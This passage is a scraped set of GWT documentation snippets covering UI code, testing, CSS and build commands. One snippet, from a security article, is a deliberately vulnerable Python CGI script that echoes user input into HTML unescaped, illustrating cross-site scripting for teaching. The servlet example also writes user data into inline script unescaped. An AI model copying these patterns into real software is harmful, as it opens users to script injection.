HtmlUnit:FF38,IE11\n```\n\n----------------------------------------\n\nTITLE: CSS Styling for Error Messages in GWT Application\nDESCRIPTION: This CSS snippet defines styles for displaying error messages in the StockWatcher application. It sets the color of error messages to red to make them visually distinct and attention-grabbing.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/RPC.md#2025-04-09_snippet_15\n\nLANGUAGE: css\nCODE:\n```\n.negativeChange {\n  color: red;\n}\n\n.errorMessage {\n  color: red;\n}\n```\n\n----------------------------------------\n\nTITLE: Accessing Embedded Data from GWT Using JSNI\nDESCRIPTION: This code shows how to access the embedded 'info' object from GWT code using JavaScript Native Interface (JSNI). This allows direct access to JavaScript variables defined in the host page.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/dynamic_host_page.md#2025-04-09_snippet_4\n\nLANGUAGE: java\nCODE:\n```\npublic native String getEmail() /*-{\n  return $wnd.info['email'];\n}-*/;\n```\n\n----------------------------------------\n\nTITLE: Testing GWT MVP with JRE-based Tests\nDESCRIPTION: Example showing how to implement JRE-based unit tests for a GWT MVP application using mocked components. The test demonstrates sorting ContactDetails without requiring a browser environment, resulting in faster test execution.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/mvp-architecture.md#2025-04-09_snippet_14\n\nLANGUAGE: java\nCODE:\n```\npublic class ExampleJRETest extends TestCase {\n  private ContactsPresenter contactsPresenter;\n  private ContactsServiceAsync mockRpcService;\n  private EventBus eventBus;\n  private ContactsPresenter.Display mockDisplay;\n\n  protected void setUp() {\n    mockRpcService = createStrictMock(ContactsServiceAsync.class);\n    eventBus = new SimpleEventBus();\n    mockDisplay = createStrictMock(ContactsPresenter.Display.class);\n    contactsPresenter = new ContactsPresenter(mockRpcService, eventBus, mockDisplay);\n  }\n\n  public void testContactSort(){\n    List<ContactDetails> contactDetails = new ArrayList<ContactDetails>();\n    contactDetails.add(new ContactDetails(\"0\", \"c_contact\"));\n    contactDetails.add(new ContactDetails(\"1\", \"b_contact\"));\n    contactDetails.add(new ContactDetails(\"2\", \"a_contact\"));\n    contactsPresenter.setContactDetails(contactDetails);\n    contactsPresenter.sortContactDetails();\n    assertTrue(contactsPresenter.getContactDetail(0).getDisplayName().equals(\"a_contact\"));\n    assertTrue(contactsPresenter.getContactDetail(1).getDisplayName().equals(\"b_contact\"));\n    assertTrue(contactsPresenter.getContactDetail(2).getDisplayName().equals(\"c_contact\"));\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating Hibernate Mapping for Account in XML\nDESCRIPTION: Defines the Hibernate mapping for the Account class, including a many-to-many relationship with Record objects.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/using_gwt_with_hibernate.md#2025-04-09_snippet_3\n\nLANGUAGE: xml\nCODE:\n```\n<hibernate-mapping>\n  <class name=\"com.google.musicstore.domain.Account\" table=\"ACCOUNT\">\n    <id name=\"id\" column=\"ACCOUNT_ID\">\n      <generator class=\"native\"/>\n    </id>\n    <property name=\"name\"/>\n    <property name=\"password\"/>\n\n    <set name=\"records\" table=\"ACCOUNT_RECORD\" lazy=\"true\">\n      <key column=\"ACCOUNT_ID\"/>\n      <many-to-many column=\"RECORD_ID\" class=\"com.google.musicstore.domain.Record\"/>\n    </set>\n  </class>\n</hibernate-mapping>\n```\n\n----------------------------------------\n\nTITLE: Collector Methods Reference\nDESCRIPTION: Collection of static factory methods available in Collectors class for creating various types of collectors used in stream operations.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/RefJreEmulation.md#2025-04-09_snippet_17\n\nLANGUAGE: java\nCODE:\n```\naveragingDouble(ToDoubleFunction), averagingInt(ToIntFunction), averagingLong(ToLongFunction), \ncollectingAndThen(Collector, Function), counting(), groupingBy(Function), \ngroupingBy(Function, Collector), groupingBy(Function, Supplier, Collector), \njoining(), joining(CharSequence), joining(CharSequence, CharSequence, CharSequence)\n```\n\n----------------------------------------\n\nTITLE: Embedding User Data in the GWT Host Page\nDESCRIPTION: This snippet demonstrates how to pass data from the server to GWT code by embedding a JavaScript object in the host page. It creates a 'info' object containing the user's email which can be accessed immediately when the GWT module loads.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/dynamic_host_page.md#2025-04-09_snippet_3\n\nLANGUAGE: java\nCODE:\n```\n// In GwtHostingServlet's doGet() method...\nwriter.append(\"<html><head>\");\nwriter.append(\"<script type=\\\"text/javascript\\\" src=\\\"sample/sample.nocache.js\\\"></script>\");\n\n// Open a second <script> tag where we will define some extra data\nwriter.append(\"<script type=\\\"text/javascript\\\">\");\n\n// Define a global JSON object called \"info\" which can contain some simple key/value pairs\nwriter.append(\"var info = { \");\n\n// Include the user's email with the key \"email\"\nwriter.append(\"\\\"email\\\" : \\\"\" + userService.getCurrentUser().getEmail() + \"\\\"\");\n\n// End the JSON object definition\nwriter.append(\" };\");\n\n// End the <script> tag\nwriter.append(\"</script>\");\nwriter.append(\"</head><body>Hello, world!</body></html>\");\n```\n\n----------------------------------------\n\nTITLE: Serializing Map with Integer Keys to JSON in GWT\nDESCRIPTION: Demonstrates how Maps with value type keys (e.g., Integer) are serialized as JSON objects using AutoBean. This example shows a Map<Integer, Foo> serialization.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideAutoBeans.md#2025-04-09_snippet_5\n\nLANGUAGE: json\nCODE:\n```\n{ \"1\" : { \"property\" : \"value\"}, \"55\" : { \"property\" : \"value\" } }\n```\n\n----------------------------------------\n\nTITLE: Native JavaScript Integration in GWT HTMLTable Class\nDESCRIPTION: This snippet demonstrates how GWT combines Java and native JavaScript code in the HTMLTable class. The setStylePrimaryName method calls a native JavaScript method getCellElement that accesses DOM elements directly.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/testing_methodologies_using_gwt.md#2025-04-09_snippet_0\n\nLANGUAGE: java\nCODE:\n```\npublic void setStylePrimaryName(int row, int column, String styleName) {\n  UIObject.setStylePrimaryName(getCellElement(bodyElem, row, column), styleName);\n}\n\nprivate native Element getCellElement(Element table, int row, int col) /*-{\n  var out = table.rows[row].cells[col];\n  return (out == null ? null : out);\n}-*/;\n```\n\n----------------------------------------\n\nTITLE: Executing GWT Tests with Selenium on Multiple Remote Systems\nDESCRIPTION: Shows how to use the Selenium run style to execute a development mode test on Firefox against two remote systems.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideTestingRemoteTesting.md#2025-04-09_snippet_4\n\nLANGUAGE: shell\nCODE:\n```\n-Dgwt.args=\"-runStyle Selenium:myhost:4444/*firefox,myotherhost:4444/*firefox\"\n```\n\n----------------------------------------\n\nTITLE: Debugging Entry Point Class Not Found Error in GWT Development Mode\nDESCRIPTION: Error message showing the 'Unable to find type' exception that occurs when running in development mode. This is often caused by missing source roots in the Java classpath, particularly common when creating launch configurations manually.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/FAQ_Troubleshooting.md#2025-04-09_snippet_10\n\nLANGUAGE: text\nCODE:\n```\nStarting HTTP on port 8888\nFinding entry point classes\n  Unable to find type 'com.google.gwt.sample.stockwatcher.client.StockWatcher'\n    Hint: Check that the type name 'com.google.gwt.sample.stockwatcher.client.StockWatcher' is really what you meant\n    Hint: Check that your classpath includes all required source roots\nFailure to load module 'com.google.gwt.sample.stockwatcher.StockWatcher'\n```\n\n----------------------------------------\n\nTITLE: Implementing onSuccess Method for JSONP Request\nDESCRIPTION: Implementation of the onSuccess method in the JsonpRequestBuilder's AsyncCallback to handle the response data and update the UI with stock information.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/Xsite.md#2025-04-09_snippet_8\n\nLANGUAGE: java\nCODE:\n```\nif (data == null) {\n  displayError(\"Couldn't retrieve JSON\");\n  return;\n}\n\nupdateTable(data);\n```\n\n----------------------------------------\n\nTITLE: HTML Structure for 9-Box Implementation\nDESCRIPTION: HTML markup structure required to implement a 9-box layout. Uses div elements with the CSS classes defined in the stylesheet to create the content area and its various borders.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideClientBundle.md#2025-04-09_snippet_48\n\nLANGUAGE: html\nCODE:\n```\n<div class=\"contentArea\">\n\n<div class=\"contentAreaTopLeftBorder\"></div>\n<div class=\"contentAreaTopBorder\"></div>\n<div class=\"contentAreaTopRightBorder\"></div>\n<div class=\"contentAreaBottomLeftBorder\"></div>\n<div class=\"contentAreaBottomBorder\"></div>\n\n<div class=\"contentAreaBottomRightBorder\"></div>\n<div class=\"contentAreaLeftBorder\"></div>\n<div class=\"contentAreaRightBorder\"></div>\n</div>\n```\n\n----------------------------------------\n\nTITLE: Debugging AccessControlException in Google App Engine Integration\nDESCRIPTION: Error stack trace showing a security exception that occurs when running a GWT application with Google App Engine enabled. This happens when server-side libraries or classes violate the Java App Engine sandbox security constraints.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/FAQ_Troubleshooting.md#2025-04-09_snippet_11\n\nLANGUAGE: text\nCODE:\n```\nWARNING: Nested in java.lang.ExceptionInInitializerError:\njava.security.AccessControlException: access denied\n(java.lang.RuntimePermission modifyThreadGroup)\n       at java.security.AccessControlContext.checkPermission(AccessControlContext.java:323)\n       at java.security.AccessController.checkPermission(AccessController.java:546)\n       at java.lang.SecurityManager.checkPermission(SecurityManager.java:532)\n       at com.google.appengine.tools.development.DevAppServerFactory\n\n```\n\n----------------------------------------\n\nTITLE: Creating a Basic GWTTestCase\nDESCRIPTION: This snippet shows how to create a GWTTestCase for testing GWT components that require JavaScript at runtime. The test class extends GWTTestCase and must override the getModuleName method to specify the GWT module being tested.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/testing_methodologies_using_gwt.md#2025-04-09_snippet_1\n\nLANGUAGE: java\nCODE:\n```\npublic class MeetingSummaryLabelTest extends GWTTestCase {\n  public String getModuleName() {\n    return \"com.danielwellman.booking.Booking\";\n  }\n\n  // Add tests here\n}\n```\n\n----------------------------------------\n\nTITLE: Parsing Numbers with NumberFormat in GWT\nDESCRIPTION: Converting a numeric string back into a double value using the NumberFormat class in GWT.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideCodingBasicsFormatting.md#2025-04-09_snippet_2\n\nLANGUAGE: java\nCODE:\n```\ndouble value = NumberFormat.getDecimalFormat().parse(\"12345.6789\");\nGWT.log(\"Parsed value is\" + value, null);\n```\n\n----------------------------------------\n\nTITLE: Implementing Basic Factorial Test in Java\nDESCRIPTION: JUnit test method to verify factorial computation for 0.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideTestingCoverage.md#2025-04-09_snippet_3\n\nLANGUAGE: java\nCODE:\n```\npublic void testFactorial() {\n  assertEquals(1, new MyApp().computeFactorial(0));\n}\n```\n\n----------------------------------------\n\nTITLE: Accessing Styles with UiRenderer in GWT\nDESCRIPTION: This snippet demonstrates how to define and access styles using UiRenderer in GWT. It includes the XML template with style definitions, the style interface, and usage in a Java event handler.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideUiBinder.md#2025-04-09_snippet_35\n\nLANGUAGE: xml\nCODE:\n```\n<ui:style field=\"myStyle\" type=\"com.my.app.AStyle\">\n  .red {color:#900;}\n  .normal {color:#000;}\n</ui:style>\n\n<div>\n  Hello, <span ui:field=\"nameSpan\" class=\"{myStyle.normal}\">\n    <ui:text from=\"{name}\"/></span>.\n</div>\n```\n\nLANGUAGE: java\nCODE:\n```\npublic interface AStyle extends CssResource {\n  String normal();\n  String red();\n}\n\ninterface MyUiRenderer extends UiRenderer {\n  // ... snip ...\n  AStyle getMyStyle();\n  // ... snip ...\n}\n\n@UiHandler({\"nameSpan\"})\nvoid onNameGotPressed(ClickEvent event, Element parent, String name) {\n  String redStyle = renderer.getMyStyle().red();\n  renderer.getNameSpan(parent).replaceClass(redStyle);\n}\n```\n\n----------------------------------------\n\nTITLE: Adding Menu Items with Material Design Components\nDESCRIPTION: Enhances the UiBinder XML template by adding menu items using Polymer Paper and Iron elements. This implements Material Design UI components with icons for the application menu.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/polymer-tutorial/widgets-buildui.md#2025-04-09_snippet_2\n\nLANGUAGE: xml\nCODE:\n```\n<ui:UiBinder xmlns:ui='urn:ui:com.google.gwt.uibinder'\n           xmlns:g='urn:import:com.google.gwt.user.client.ui'\n           xmlns:p='urn:import:com.vaadin.polymer.paper.widget'\n           xmlns:i='urn:import:com.vaadin.polymer.iron.widget'>\n\n    <g:HTMLPanel>\n      <p:PaperIconItem ui:field=\"menuClearAll\">\n          <i:IronIcon icon=\"delete\" attributes=\"item-icon\"/>\n          <div>Clear All</div>\n      </p:PaperIconItem>\n      <p:PaperIconItem ui:field=\"menuClearDone\">\n          <i:IronIcon icon=\"clear\" attributes=\"item-icon\"/>\n          <div>Clear Done</div>\n      </p:PaperIconItem>\n      <p:PaperIconItem ui:field=\"menuSettings\">\n          <i:IronIcon icon=\"settings\" attributes=\"item-icon\"/>\n          <div>Settings</div>\n      </p:PaperIconItem>\n      <p:PaperIconItem ui:field=\"menuAbout\">\n          <i:IronIcon icon=\"help\" attributes=\"item-icon\"/>\n          <div>About</div>\n      </p:PaperIconItem>\n    </g:HTMLPanel>\n</ui:UiBinder>\n```\n\n----------------------------------------\n\nTITLE: Implementing GWT Meeting Model\nDESCRIPTION: This snippet shows the implementation of the Meeting class, which serves as the model in the GWT application. It contains a simple property for meeting capacity.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/testing_methodologies_using_gwt.md#2025-04-09_snippet_9\n\nLANGUAGE: Java\nCODE:\n```\npublic class Meeting {\n  private Integer capacity;\n\n  public int getCapacity() {\n    return capacity;\n  }\n\n  public void setCapacity(int capacity) {\n    this.capacity = capacity;\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Generating GWT Class Files with Ant\nDESCRIPTION: Ant command to generate class files for GWT project in development mode.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideTestingCoverage.md#2025-04-09_snippet_5\n\nLANGUAGE: shell\nCODE:\n```\nant devmode\n```\n\n----------------------------------------\n\nTITLE: Embedding YouTube Video for DayZipping GWT Case Study\nDESCRIPTION: HTML iframe code that embeds a YouTube video about DayZipping's use of GWT to improve site performance and developer productivity.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/casestudies.md#2025-04-09_snippet_0\n\nLANGUAGE: html\nCODE:\n```\n<iframe width=\"320\" height=\"182\" src=\"https://www.youtube.com/embed/6GhH5LGCsms\" frameborder=\"0\" allowfullscreen></iframe>\n```\n\n----------------------------------------\n\nTITLE: Markdown Structure for GWT Guide\nDESCRIPTION: Basic markdown structure defining the GWT reference guide sections with links to API reference, JRE emulation, and widget gallery documentation.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/RefGuide.md#2025-04-09_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\nGuide\n===\n\nThe GWT reference guide provides javadoc for GWT and related libraries, and technical details for GWT widgets.\n\n1.  [GWT API Reference](RefGWTClassAPI.html)\n2.  [JRE Emulation Reference](RefJreEmulation.html)\n3.  [Widget Gallery](RefWidgetGallery.html)\n```\n\n----------------------------------------\n\nTITLE: Runtime Evaluation in GSS Conditional CSS\nDESCRIPTION: Demonstrates how to use Java code for runtime conditional evaluation in GSS by using the eval() function with a static boolean method from a Java class.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideGssVsCss.md#2025-04-09_snippet_7\n\nLANGUAGE: css\nCODE:\n```\n/* CSS */\n@if (com.module.Foo.staticBooleanFunction()) {\n  .foo {...}\n}\n/* GSS */\n@if (eval(\"com.module.Foo.staticBooleanFunction()\")) {\n  .foo{...}\n}\n```\n\n----------------------------------------\n\nTITLE: Working with Java Class Objects\nDESCRIPTION: The Class class represents classes and interfaces in a running Java application. It provides introspection methods.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/RefJreEmulation.md#2025-04-09_snippet_1\n\nLANGUAGE: Java\nCODE:\n```\nClass.getName()\nClass.getSuperclass()\nClass.isInterface()\nClass.isPrimitive()\n```\n\n----------------------------------------\n\nTITLE: Running GWT Tests with Ant for Coverage\nDESCRIPTION: Ant command to run GWT tests in development mode with EMMA for coverage data collection.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideTestingCoverage.md#2025-04-09_snippet_7\n\nLANGUAGE: shell\nCODE:\n```\nant test.dev\n```\n\n----------------------------------------\n\nTITLE: Inheriting XML Module in GWT\nDESCRIPTION: Adds the XML module to a GWT project by including it in the module XML file.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideCodingBasicsXML.md#2025-04-09_snippet_0\n\nLANGUAGE: xml\nCODE:\n```\n<inherits name=\"com.google.gwt.xml.XML\" />\n```\n\n----------------------------------------\n\nTITLE: Direct Usage of resourceUrl in GSS\nDESCRIPTION: Shows how to directly use the resourceUrl() function in CSS rules to reference images from a ClientBundle without defining intermediate constants.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideGssVsCss.md#2025-04-09_snippet_12\n\nLANGUAGE: css\nCODE:\n```\n/* Direct usage of resourceUrl */\n.logout {\n    background-image: resourceUrl(\"logout\");\n}\n```\n\n----------------------------------------\n\nTITLE: Accessing Resources in GWT Feed Reader\nDESCRIPTION: This snippet shows the Java interface for accessing module resources in the GWT Feed Reader application. It demonstrates the use of GWT's resource handling mechanism for efficient management of CSS and image files.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/gwt-iphone.md#2025-04-09_snippet_1\n\nLANGUAGE: Java\nCODE:\n```\ncom.google.gwt.sample.feedreader.client.resources.Resources\n```\n\n----------------------------------------\n\nTITLE: Expanding Factorial Test Coverage in Java\nDESCRIPTION: Enhanced JUnit test method to verify factorial computation for 0 and 2.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideTestingCoverage.md#2025-04-09_snippet_4\n\nLANGUAGE: java\nCODE:\n```\npublic void testFactorial() {\n  assertEquals(1, new MyApp().computeFactorial(0));\n  assertEquals(2, new MyApp().computeFactorial(2));\n}\n```\n\n----------------------------------------\n\nTITLE: Inheriting HTTP Module in GWT Configuration\nDESCRIPTION: XML configuration to inherit the HTTP module required for using RequestBuilder class in GWT applications.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/FAQ_Server.md#2025-04-09_snippet_2\n\nLANGUAGE: xml\nCODE:\n```\n<inherits name=\"com.google.gwt.http.HTTP\"/>\n```\n\n----------------------------------------\n\nTITLE: Generating Markdown Table for GWT Third-Party Software Licenses\nDESCRIPTION: This markdown snippet creates a table listing third-party software packages bundled with GWT, their licenses, and source code availability. It provides a structured format for presenting this information.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/terms.md#2025-04-09_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n| Package                               | License                                                                           | Source Code Availability                                                                                                               |\n| ------------------------------------- | --------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------- |\n| Apache Tomcat                         | Apache License v. 2.0 (above)                                                     | [tomcat.apache.org](http://tomcat.apache.org/) modifications are at org/apache/tomcat within gwt-dev.jar                               |\n| Browser Detect v2.1.6                 | [Creative Commons Attribution 1.0](http://creativecommons.org/licenses/by/1.0/)   | [google-web-toolkit.googlecode.com](http://google-web-toolkit.googlecode.com/) transliterated into Java source                         |\n| Eclipse Java Development Tools (JDT)  | [Eclipse Public License v. 1.0](http://www.eclipse.org/legal/epl-v10.html)        | [eclipse.org](http://archive.eclipse.org/eclipse/downloads/drops/R-3.1.1-200509290840/download.php?dropFile=eclipse-JDT-SDK-3.1.1.zip) |\n| Eclipse Standard Widget Toolkit (SWT) | [Eclipse Public License v. 1.0](http://www.eclipse.org/legal/epl-v10.html)        | modifications are at org/eclipse/swt within gwt-dev.jar                                                                                |\n| HtmlUnit                              | Apache License v. 2.0 (above)                                                     | [htmlunit.sourceforge.net](http://htmlunit.sourceforge.net/)                                                                           |\n| JFreeChart                            | [GNU Lesser General Public License v. 2.1](http://www.gnu.org/licenses/lgpl.html) | [jfree.org](http://jfree.org/jfreechart/download.html)                                                                                 |\n| Mozilla Rhino                         | [Mozilla Public License v. 1.1](http://www.mozilla.org/MPL/MPL-1.1.txt)           | com/google/gwt/dev/js/rhino/ within gwt-dev.jar                                                                                        |\n| Mozilla 1.7.12 (Linux only)           | [Mozilla Public License v. 1.1](http://www.mozilla.org/MPL/MPL-1.1.txt)           | [mozilla.org](http://developer.mozilla.org/en/docs/Download_Mozilla_Source_Code)                                                       |\n| Protocol Buffers                      | [New BSD License](http://www.opensource.org/licenses/bsd-license.php)             | [code.google.com/p/protobuf](http://code.google.com/p/protobuf/)                                                                       |\n| WebKit 418.9 (Mac only)               | [GNU Lesser General Public License v. 2.1](http://www.gnu.org/licenses/lgpl.html) | [webkit.org](http://webkit.org/building/checkout.html)                                                                                 |\n```\n\n----------------------------------------\n\nTITLE: Error Message for Widget without Default Constructor in UiBinder\nDESCRIPTION: Shows the error message produced when attempting to use a widget that requires constructor arguments but lacks the necessary UiBinder support.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideUiBinder.md#2025-04-09_snippet_13\n\nLANGUAGE: text\nCODE:\n```\n[ERROR] com.my.app.widgets.CricketScores has no default (zero args)\nconstructor. To fix this, you can define a @UiFactory method on the\nUiBinder's owner, or annotate a constructor of CricketScores with\n@UiConstructor.\n```\n\n----------------------------------------\n\nTITLE: Specifying RemoteWeb Run Style for GWT Testing\nDESCRIPTION: Shows how to specify the RemoteWeb run style to run a test against a specific browser (IE8 in this example) on a remote host.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideTestingRemoteTesting.md#2025-04-09_snippet_7\n\nLANGUAGE: text\nCODE:\n```\n-runStyle RemoteWeb:rmi://myhost/ie8\n```\n\n----------------------------------------\n\nTITLE: Adding Anonymous ClickHandler to Button in GWT\nDESCRIPTION: This snippet demonstrates how to add a custom ClickHandler as an anonymous inner class to a Button instance in GWT. It shows the basic structure of event handling but notes that this approach may use excessive memory for a large number of widgets.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideUiHandlers.md#2025-04-09_snippet_0\n\nLANGUAGE: java\nCODE:\n```\npublic void anonClickHandlerExample() {\n  Button b = new Button(\"Click Me\");\n  b.addClickHandler(new ClickHandler() {\n    public void onClick(ClickEvent event) {\n      // handle the click event\n    }\n  });\n}\n```\n\n----------------------------------------\n\nTITLE: Vulnerable Python CGI Script\nDESCRIPTION: Demonstrates a security vulnerability where user input is directly inserted into HTML output without proper escaping.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/security_for_gwt_applications.md#2025-04-09_snippet_2\n\nLANGUAGE: python\nCODE:\n```\nimport cgi\nf = cgi.FieldStorage()\nname = f.getvalue('name') or 'there'\n\ns = '<html><body><div>Hello, ' + name + '!</div></body></html>'\n\nprint 'Content-Type: text/html'\nprint 'Content-Length: %s' % (len(s),)\nprint\nprint s\n```\n\n----------------------------------------\n\nTITLE: Error Message from Development Mode for JSNI Type Mismatch\nDESCRIPTION: This snippet shows the exception message displayed in development mode when a JSNI method returns a value of the wrong type. It illustrates how GWT's runtime checks catch type mismatches that the compiler cannot detect.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideCodingBasicsJSNI.md#2025-04-09_snippet_2\n\nLANGUAGE: text\nCODE:\n```\ncom.google.gwt.dev.shell.HostedModeException: invokeNativeInteger(@com.example.client.GWTObjectNotifyTest::badExample()): JS value of type string, expected int\n    at com.google.gwt.dev.shell.JsValueGlue.getIntRange(JsValueGlue.java:343)\n    at com.google.gwt.dev.shell.JsValueGlue.get(JsValueGlue.java:179)\n    at com.google.gwt.dev.shell.ModuleSpace.invokeNativeInt(ModuleSpace.java:233)\n    at com.google.gwt.dev.shell.JavaScriptHost.invokeNativeInt(JavaScriptHost.java:97)\n    at com.example.client.GWTObjectNotifyTest.badExample(GWTObjectNotifyTest.java:29)\n    at com.example.client.GWTObjectNotifyTest$1.onClick(GWTObjectNotifyTest.java:52)\n    ...\n```\n\n----------------------------------------\n\nTITLE: Starting BrowserManagerServer for RemoteWeb Run Style\nDESCRIPTION: Java command to start the BrowserManagerServer on a remote test system, associating a browser name with its executable path.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideTestingRemoteTesting.md#2025-04-09_snippet_6\n\nLANGUAGE: shell\nCODE:\n```\njava -cp gwt-user.jar;gwt-dev.jar com.google.gwt.junit.remote.BrowserManagerServer ie8 \"C:\\Program Files\\Internet Explorer\\IEXPLORE.EXE\"\n```\n\n----------------------------------------\n\nTITLE: Code Splitting with GWT.runAsync() in Java\nDESCRIPTION: The GWT.runAsync() method allows developers to implement code splitting in GWT applications. This enables the application to load only the minimum script needed for startup while downloading additional code as needed, reducing initial load time.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/release-notes.md#2025-04-09_snippet_7\n\nLANGUAGE: Java\nCODE:\n```\nGWT.runAsync(new RunAsyncCallback() {\n    // Code placed here will be loaded only when needed\n});\n```\n\n----------------------------------------\n\nTITLE: Adding UTF-8 Character Encoding Meta Tag in HTML for GWT Internationalization\nDESCRIPTION: This HTML meta tag ensures proper display of international characters in GWT applications by setting the content type to UTF-8. Add this tag to the head element of your HTML host page when your web content contains localized data.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/FAQ_Troubleshooting.md#2025-04-09_snippet_12\n\nLANGUAGE: html\nCODE:\n```\n<meta http-equiv=\"content-type\" content=\"text/html;charset=utf-8\" />`\n```\n\n----------------------------------------\n\nTITLE: Obfuscated Compiled JavaScript Output for onModuleLoad()\nDESCRIPTION: This snippet displays the obfuscated JavaScript output for the onModuleLoad() method. It shows how GWT further optimizes the code by minimizing variable names and structure.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideCodingBasicsOverlay.md#2025-04-09_snippet_7\n\nLANGUAGE: javascript\nCODE:\n```\nfunction B(){var a,b,c;a=$wnd.jsonData;for(b=0,c=a.length;b<c;++b){\n  $wnd.alert(l+(a[b].FirstName+m+a[b].LastName))}\n```\n\n----------------------------------------\n\nTITLE: Running GWT Tests in Production Mode with Selenium\nDESCRIPTION: Shows how to run GWT tests in production mode using Selenium, which doesn't require the GWT Developer Plugin on the remote system.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideTestingRemoteTesting.md#2025-04-09_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\n-Dgwt.args=\"-prod -runStyle Selenium:myhost:4444/*firefox\"\n```\n\n----------------------------------------\n\nTITLE: Panel Methods for Widget Management\nDESCRIPTION: Methods for adding and removing widgets from panels. The adopt() and disown() methods have been deprecated in favor of add() and remove().\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/release-notes.md#2025-04-09_snippet_15\n\nLANGUAGE: java\nCODE:\n```\nPanel.adopt(Widget, Element)\n```\n\nLANGUAGE: java\nCODE:\n```\nPanel.disown(Widget)\n```\n\nLANGUAGE: java\nCODE:\n```\nPanel.add(Widget)\n```\n\nLANGUAGE: java\nCODE:\n```\nPanel.remove(Widget)\n```\n\n----------------------------------------\n\nTITLE: Initializing a Basic GWT Widget with Event Handling\nDESCRIPTION: This snippet demonstrates how to create a basic GWT widget that handles click events. It uses the sinkEvents method to register for click events and implements the onBrowserEvent method to handle them.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/dom_events_memory_leaks_and_you.md#2025-04-09_snippet_0\n\nLANGUAGE: java\nCODE:\n```\nclass MyWidget extends Widget {\n  public MyWidget() {\n    setElement(DOM.createDiv());\n    sinkEvents(Event.ONCLICK);\n  }\n\n  public void onBrowserEvent(Event evt) {\n    switch (DOM.eventGetType(evt)) {\n      case Event.ONCLICK:\n        // Do something insightful.\n        break;\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: CSS Styling for Panel Debug Borders in GWT\nDESCRIPTION: CSS definitions that set different border colors for panels to help with layout debugging. This makes it easier to distinguish between different container elements when troubleshooting layout issues.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/FAQ_UI.md#2025-04-09_snippet_2\n\nLANGUAGE: css\nCODE:\n```\n.dockPanel {\n    border-color: orange;\n}\n.vertPanel {\n    border-color: blue;\n}\n```\n\n----------------------------------------\n\nTITLE: Specifying Run Style for GWT Remote Testing\nDESCRIPTION: Shows the general format for specifying a run style when running GWT tests remotely. The run style name should start with a capital letter.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideTestingRemoteTesting.md#2025-04-09_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\n-runStyle 